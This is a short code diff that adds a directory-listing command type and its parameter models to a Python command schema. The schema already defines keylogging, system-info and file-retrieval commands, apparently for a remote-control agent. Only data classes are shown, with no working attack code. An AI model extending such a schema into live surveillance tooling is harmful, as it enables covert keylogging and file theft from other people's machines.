@@ -11,6 +11,7 @@ class CommandType(str, enum.Enum):
     KeyLog = "KeyLog"
     GetSystemInfo = "GetSystemInfo"
     GetFile = "GetFile"
+    DirList = "DirList"
 
 
 class BasicCommand(BaseModel):
@@ -44,4 +45,14 @@ class GetFileParameters(BaseModel):
 class GetFileCommand(BasicCommand):
     command_type: CommandType = CommandType.GetFile
     parameters: GetFileParameters
+
+
+class DirListParameters(BaseModel):
+    path: str
+    depth: Optional[int]
+
+
+class DirListCommand(BasicCommand):
+    command_type: CommandType = CommandType.DirList
+    parameters: DirListParameters
 
